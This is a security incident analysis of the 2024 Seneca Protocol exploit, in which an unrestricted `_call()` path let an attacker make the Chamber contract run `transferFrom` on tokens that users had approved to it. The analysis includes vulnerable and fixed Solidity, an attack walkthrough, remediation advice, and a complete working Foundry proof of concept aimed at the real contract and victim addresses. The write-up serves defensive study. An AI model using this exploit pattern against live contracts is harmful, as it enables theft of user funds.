# Seneca Protocol — Arbitrary External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-28 |
| **Protocol** | Seneca Protocol |
| **Chain** | Ethereum |
| **Loss** | ~$6,000,000 |
| **Attacker** | [0x9464...42DC](https://etherscan.io/address/0x94641c01a4937f2C8eF930580cF396142a2942DC) |
| **Attack Tx** | [0x23fc...1286](https://etherscan.io/tx/0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286) |
| **Vulnerable Contract** | [0x65c2...1F06](https://etherscan.io/address/0x65c210c59B43EB68112b7a4f75C8393C36491F06) (Chamber Proxy) |
| **Implementation Contract** | [0x45e1...48B](https://etherscan.io/address/0x45e15d1e4F92f28A916F4f2971Ad9adc278e148B) (Chamber Implementation) |
| **Root Cause** | The `_call()` function inside `performOperations()` can invoke arbitrary external contracts with user-controlled calldata — allowing the attacker to drain tokens that victims had previously `approve`d to the Chamber contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Seneca_exp.sol) |

---

## 1. Vulnerability Overview

Seneca Protocol's `Chamber` contract is a BentoBox-based collateralized lending protocol. Users can deposit collateral and borrow senUSD, with the `performOperations()` function allowing batch execution of deposit, withdrawal, repayment, and other compound operations.

The core of the vulnerability lies in the `_call()` internal function, which is invoked when the `OPERATION_CALL (= 30)` action is requested inside `performOperations()`. This function executes an external call (`callee.call{value: value}(callData)`) to an arbitrary contract address with arbitrary calldata — both fully controlled by the caller.

A blacklist check (`require(!blacklisted[callee])`) exists, but the blacklist only covers `bentoBox`, the Chamber contract itself, and the BentoBox owner. ERC-20 token contracts (e.g., `PendlePrincipalToken`) are not on the blacklist and can therefore be called freely.

Using Chamber as a vehicle, an attacker could inject a `transferFrom(victim, attacker, amount)` call against victims who had previously granted an `approve` to the Seneca Chamber contract, stealing their tokens without authorization.

---

## 2. Vulnerable Code Analysis

### 2.1 `_call()` — Arbitrary External Call Execution (Core Vulnerability)

```solidity
// ❌ Vulnerable code — Chamber.sol (implementation 0x45e1...48B)
function _call(
    uint256 value,
    bytes memory data,
    uint256 value1,
    uint256 value2
) whenNotPaused internal returns (bytes memory, uint8) {
    // Decode callee address and callData — fully controlled by the user
    (address callee, bytes memory callData, bool useValue1, bool useValue2, uint8 returnValues) =
        abi.decode(data, (address, bytes, bool, bool, uint8));

    // Optionally append value1/value2 to callData based on useValue flags
    if (useValue1 && !useValue2) {
        callData = abi.encodePacked(callData, value1);
    } else if (!useValue1 && useValue2) {
        callData = abi.encodePacked(callData, value2);
    } else if (useValue1 && useValue2) {
        callData = abi.encodePacked(callData, value1, value2);
    }

    // ❌ Blacklist check: only blocks bentoBox, Chamber itself, and BentoBox owner
    //    ERC-20 token addresses are NOT on the blacklist → calls allowed
    require(!blacklisted[callee], "Chamber: can't call");

    // ❌ Executes external call to arbitrary address with arbitrary calldata
    //    Chamber contract is msg.sender → can exploit tokens victim approved to Chamber
    (bool success, bytes memory returnData) = callee.call{value: value}(callData);
    require(success, "Chamber: call failed");
    return (returnData, returnValues);
}
```

```solidity
// ✅ Fixed code — restrict callable contracts via allowlist
function _call(
    uint256 value,
    bytes memory data,
    uint256 value1,
    uint256 value2
) whenNotPaused internal returns (bytes memory, uint8) {
    (address callee, bytes memory callData, bool useValue1, bool useValue2, uint8 returnValues) =
        abi.decode(data, (address, bytes, bool, bool, uint8));

    if (useValue1 && !useValue2) {
        callData = abi.encodePacked(callData, value1);
    } else if (!useValue1 && useValue2) {
        callData = abi.encodePacked(callData, value2);
    } else if (useValue1 && useValue2) {
        callData = abi.encodePacked(callData, value1, value2);
    }

    // ✅ Only allow calls to contracts registered in the allowlist
    require(allowlisted[callee], "Chamber: callee not allowed");

    // ✅ Additional: block dangerous function selectors (transferFrom, approve, etc.)
    bytes4 selector;
    if (callData.length >= 4) {
        assembly { selector := mload(add(callData, 32)) }
    }
    require(!blockedSelectors[selector], "Chamber: selector not allowed");

    (bool success, bytes memory returnData) = callee.call{value: value}(callData);
    require(success, "Chamber: call failed");
    return (returnData, returnValues);
}
```

**Problem**: The `_call()` function is designed to let callers fully control both `callee` and `callData`. Since the blacklist only blocks Chamber itself and BentoBox, an attacker can specify an ERC-20 token address as `callee` and inject `transferFrom(victim, attacker, amount)` as `callData`. The Chamber contract then executes that `transferFrom` as `msg.sender`, directly exploiting the `approve` allowance victims had already granted to Chamber.

### 2.2 `performOperations()` — Batch Execution Entry Point

```solidity
// ❌ Vulnerable code — OPERATION_CALL branch: delegates to _call() without validation
} else if (action == Constants.OPERATION_CALL) {
    // ❌ Anyone who includes OPERATION_CALL(=30) in the actions array
    //    triggers _call(), enabling arbitrary external calls
    (bytes memory returnData, uint8 returnValues) = _call(values[i], datas[i], value1, value2);

    if (returnValues == 1) {
        (value1) = abi.decode(returnData, (uint256));
    } else if (returnValues == 2) {
        (value1, value2) = abi.decode(returnData, (uint256, uint256));
    }
}
```

```solidity
// ✅ Fixed code — restrict OPERATION_CALL to privileged callers only
} else if (action == Constants.OPERATION_CALL) {
    // ✅ OPERATION_CALL restricted to the protocol admin (owner) only
    require(msg.sender == masterContract.owner(), "Chamber: CALL action restricted");
    (bytes memory returnData, uint8 returnValues) = _call(values[i], datas[i], value1, value2);
    // ...
}
```

### 2.3 Incomplete Blacklist Coverage

```solidity
// ❌ Vulnerable code — token contracts not included in blacklist
constructor(IBentoBoxV1 bentoBox_, IERC20 senUSD_) {
    bentoBox = bentoBox_;
    senUSD = senUSD_;
    masterContract = this;
    
    // Blacklist only adds BentoBox, Chamber itself, and BentoBox owner
    // ❌ Collateral tokens and other ERC-20 tokens are NOT blacklisted
    blacklisted[address(bentoBox)] = true;
    blacklisted[address(this)] = true;
    blacklisted[Ownable(address(bentoBox)).owner()] = true;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker completes the exploit with a single EOA transaction — no flash loans, no collateral deposits, no prior setup required. The only prerequisite is that **victims had already granted a token `approve` to the Seneca Chamber contract**.

- Victim address: `0x9CBF...06ce`
- Victim's PendlePrincipalToken balance: `~878 PT-tokens (~$6M)`
- Victim had already granted an `approve` on that token to the Chamber address (`0x65c2...1F06`)

### 3.2 Execution Phase

```
Step 1: Construct malicious calldata
   - Encode transferFrom(victim, attacker, amount)
   - target: PendlePrincipalToken address (not on blacklist)

Step 2: Call performOperations()
   - actions = [30] (OPERATION_CALL)
   - values  = [0]
   - datas   = [abi.encode(PendlePrincipalToken, callData, false, false, 0)]

Step 3: Chamber._call() executes internally
   - callee  = PendlePrincipalToken ← passes blacklist check ✗
   - Chamber contract calls transferFrom as msg.sender

Step 4: ERC-20 transferFrom executes
   - from: victim (0x9CBF...06ce)
   - to:   attacker (0x9464...42DC)
   - amount: victim's entire balance
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────┐
│  Attacker EOA                        │
│  0x9464...42DC                      │
│                                     │
│  actions = [OPERATION_CALL(=30)]    │
│  data = encode(                     │
│    callee: PendlePrincipalToken,    │
│    callData: transferFrom(          │
│      victim → attacker, amount      │
│    )                                │
│  )                                  │
└─────────────────┬───────────────────┘
                  │ performOperations() call
                  ▼
┌─────────────────────────────────────┐
│  Chamber Proxy                      │
│  0x65c2...1F06                      │
│  (EIP-1167 MinimalProxy)            │
└─────────────────┬───────────────────┘
                  │ delegatecall
                  ▼
┌─────────────────────────────────────┐
│  Chamber Implementation             │
│  0x45e1...48B                       │
│                                     │
│  performOperations() entered        │
│  → action == OPERATION_CALL(30)     │
│  → _call() invoked                  │
│                                     │
│  Inside _call():                    │
│  ┌───────────────────────────────┐  │
│  │ require(!blacklisted[callee]) │  │
│  │ ← token not on blacklist      │  │
│  │   check passes ✗ (vuln!)      │  │
│  └───────────────┬───────────────┘  │
│                  │                  │
│  callee.call(callData)              │
│  ← Chamber is msg.sender            │
└─────────────────┬───────────────────┘
                  │ transferFrom(victim, attacker, amount)
                  ▼
┌─────────────────────────────────────┐
│  PendlePrincipalToken               │
│  0xB05c...95E                       │
│                                     │
│  msg.sender = Chamber               │
│  allowance[victim][Chamber] > 0     │
│  ← victim had pre-approved Chamber  │
│                                     │
│  transfers victim's full balance    │
│  → sent to attacker's wallet        │
└─────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│  Attack Result                      │
│  Attacker gained: ~878 PT tokens    │
│  Protocol loss: ~$6,000,000         │
└─────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~878 PendlePrincipalTokens (~$6,000,000)
- **Protocol impact**: No direct protocol TVL loss, but tokens stolen directly from user wallets
- **Single transaction** completed: block 19,325,937

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Loss: ~$6M
// Attacker: 0x94641c01a4937f2c8ef930580cf396142a2942dc
// Vulnerable Contract: 0x65c210c59b43eb68112b7a4f75c8393c36491f06
// Attack Tx: 0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286

// Chamber interface — defines the batch operation execution function
interface IChamber {
    function performOperations(
        uint8[] memory actions,   // Array of operation codes to execute
        uint256[] memory values,  // ETH amount to send with each operation
        bytes[] memory datas      // ABI-encoded parameters for each operation
    ) external payable returns (uint256 value1, uint256 value2);
}

contract ContractTest is Test {
    // Seneca Chamber proxy contract address
    IChamber private constant Chamber = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    // Target token: Pendle Principal Token (the token victim approved to Chamber)
    IERC20 private constant PendlePrincipalToken = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    // Victim address (wallet that had already granted token approve to Chamber)
    address private constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
    // OPERATION_CALL constant value = 30 (arbitrary external call operation code)
    uint8 public constant OPERATION_CALL = 30;

    function setUp() public {
        // Fork mainnet at the block just before the attack
        vm.createSelectFork("mainnet", 19_325_936);
        vm.label(address(Chamber), "Chamber");
        vm.label(address(PendlePrincipalToken), "PendlePrincipalToken");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        // [Step 1] Query victim's full token balance
        uint256 amount = PendlePrincipalToken.balanceOf(victim);

        // [Step 2] Construct malicious calldata: transferFrom(victim → attacker, full amount)
        //          Chamber will execute this call as msg.sender
        bytes memory callData =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);

        // [Step 3] Build the data packet to pass into _call()
        //          (callee=token address, callData=malicious calldata, useValue1=false, useValue2=false, returnValues=0)
        bytes memory data = abi.encode(address(PendlePrincipalToken), callData, uint256(0), uint256(0), uint256(0));

        // [Step 4] Build batch parameter arrays
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        // actions[0] = 30 (OPERATION_CALL): specify arbitrary external call operation
        uint8[] memory actions = new uint8[](1);
        actions[0] = OPERATION_CALL;

        // values[0] = 0: no ETH transfer
        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        // Print attacker balance before attack
        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance before attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );

        // [Step 5] Core attack: call performOperations()
        //          Chamber._call() executes PendlePrincipalToken.transferFrom()
        //          Chamber is msg.sender → drains victim's full balance using their approve
        Chamber.performOperations(actions, values, datas);

        // Print attacker balance after attack (confirms victim's tokens fully transferred)
        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance after attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Arbitrary External Call | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md` |
| V-02 | Incomplete Blacklist-Based Access Control | HIGH | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-03 | Call Context Abuse (msg.sender Privilege Exploitation) | HIGH | CWE-441 (Unintended Proxy) | `07_token_integration.md` |

### V-01: Arbitrary External Call

- **Description**: The `_call()` function executes a user-supplied `callee` address and `callData` without validation. There is no function selector check and no allowlist-based callee verification.
- **Impact**: Any user wallet that had granted an `approve` to the Chamber contract is vulnerable to arbitrary token theft. In practice, ~$6M in tokens was drained in a single transaction.
- **Attack Condition**: Requires only that the victim had granted an ERC-20 token `approve` to the Chamber contract. No flash loan, price manipulation, or additional setup needed.

### V-02: Incomplete Blacklist-Based Access Control

- **Description**: The blacklist includes only BentoBox, Chamber itself, and the BentoBox owner. ERC-20 token contracts and external DeFi protocol addresses are not blocked.
- **Impact**: The blacklist signals intent to restrict calls, but its scope is so narrow it provides virtually no meaningful protection.
- **Attack Condition**: Specifying any contract not on the blacklist as `callee` is immediately exploitable.

### V-03: Call Context Abuse (msg.sender Privilege Exploitation)

- **Description**: When Chamber makes an external call, `msg.sender` becomes Chamber itself. This means any `approve` allowances users granted to Chamber for legitimate DeFi use are weaponizable by attackers.
- **Impact**: Not only the protocol's own TVL but every user wallet that had interacted with the protocol is exposed to risk.
- **Attack Condition**: Exploitable as long as any single user wallet has granted Chamber an `approve`.

---

## 6. Remediation Recommendations

### Immediate Actions

**Option A: Restrict `OPERATION_CALL` to Privileged Callers**

```solidity
// ✅ Restrict OPERATION_CALL to admin-only within performOperations()
} else if (action == Constants.OPERATION_CALL) {
    // OPERATION_CALL is only available to the protocol admin
    require(
        msg.sender == masterContract.owner(),
        "Chamber: CALL action restricted to owner"
    );
    (bytes memory returnData, uint8 returnValues) = _call(values[i], datas[i], value1, value2);
    // ...
}
```

**Option B: Remove the `_call()` Function Entirely**

```solidity
// ✅ Remove the OPERATION_CALL branch entirely (safest approach)
// Completely delete the OPERATION_CALL(=30) case from performOperations()
```

**Option C: Allowlist + Selector Blocking**

```solidity
// ✅ Enforce allowlist check + block dangerous selectors in _call()
mapping(address => bool) public allowlisted;
mapping(bytes4 => bool) public blockedSelectors;

function _call(uint256 value, bytes memory data, ...) internal returns (...) {
    (address callee, bytes memory callData, ...) = abi.decode(data, (...));
    
    // Only allow addresses registered in the allowlist
    require(allowlisted[callee], "Chamber: callee not allowlisted");
    
    // Block dangerous selectors: transferFrom, approve, transfer, etc.
    if (callData.length >= 4) {
        bytes4 selector;
        assembly { selector := mload(add(callData, 32)) }
        require(!blockedSelectors[selector], "Chamber: blocked selector");
    }
    
    (bool success, bytes memory returnData) = callee.call{value: value}(callData);
    require(success, "Chamber: call failed");
    return (returnData, returnValues);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Arbitrary External Call | Remove `OPERATION_CALL` or restrict it to admin-only. Arbitrary external call capability is unnecessary in the normal user workflow |
| V-02 Incomplete Blacklist | Replace blacklist with an allowlist. Apply a deny-by-default principle |
| V-03 msg.sender Privilege Abuse | Acknowledge that msg.sender is Chamber before any external call, and block ERC-20-related selectors (`transferFrom`, `approve`, `transfer`) at the system level |
| Overall Design | Batch execution functions should block user-controlled external calls by default; if needed, add a separate access control layer |

---

## 7. Lessons Learned

1. **Arbitrary external calls must be blocked by default**: In DeFi protocols, allowing users to supply an arbitrary contract address and calldata for the protocol to execute externally is extremely dangerous. Blacklists are a reactive defense — they only block known addresses. Allowlist-based proactive defense is essential.

2. **Design with `msg.sender` context in mind**: When a contract becomes `msg.sender` for an external call, that call inherits all `approve` allowances ever granted to that contract. This must be accounted for whenever external calls are permitted inside batch execution functions.

3. **Minimize user approve scope**: From the user's perspective, always `approve` only the minimum required amount when interacting with a protocol, and avoid unlimited approvals (`type(uint256).max`). In this incident, the victim had granted Chamber an approval for their entire token balance.

4. **Batch execution functions require especially careful auditing**: Functions like `performOperations()` that process multiple operations in one call can produce unexpected security issues from combinations of action types. Each action code's permissions and execution context must be clearly documented and audited.

5. **Related pattern — similar cases**: BentoBox-based protocols (Kashi, Abracadabra's Cauldron, etc.) use similar batch execution architectures. In fork projects, new vulnerabilities can emerge when the security assumptions of the original code are changed or when additional features are carelessly grafted on.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Transaction Hash | `0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286` |
| Block Number | 19,325,937 |
| From (Attacker EOA) | `0x94641c01a4937f2C8eF930580cF396142a2942DC` |
| To (Chamber Proxy) | `0x65c210c59B43EB68112b7a4f75C8393C36491F06` |
| ETH Transferred | 0 ETH |
| Gas Limit | 120,108 |
| Function Selector | `0x568d8cd9` (`performOperations`) |

### 8.2 Calldata Analysis

The on-chain input data confirms:
- `actions = [0x1e]` → `30 = OPERATION_CALL` ✅
- `values = [0]` ✅
- `datas[0]` inner callData contains `0x23b872dd` (`transferFrom(address,address,uint256)`) ✅
- Victim address `0x9cbf...06ce` and attacker address `0x9464...42dc` present ✅
- Transfer amount: `0x4b180b86618eddc3ab` ≈ 878.x PT tokens ✅

### 8.3 PoC vs. On-Chain Data Comparison

| Field | PoC Construction | On-Chain Actual Value | Match |
|------|---------|-------------|------|
| Action code | `OPERATION_CALL = 30` | `0x1e = 30` | ✅ |
| Target token | `PendlePrincipalToken (0xB05c...95E)` | Confirmed in calldata | ✅ |
| Victim address | `0x9CBF...06ce` | Confirmed in calldata | ✅ |
| Transfer direction | `victim → attacker` | Confirmed via Transfer event | ✅ |
| Flash loan used | None | Single Tx, no external borrowing | ✅ |

### 8.4 Attack Structure Summary

This attack is remarkably simple. No attack contract was deployed, no flash loan was used, and no complex setup was required. A single EOA made a single transaction directly calling Chamber's `performOperations()` and transferred the victim's entire token balance. This starkly illustrates just how severe the vulnerability was.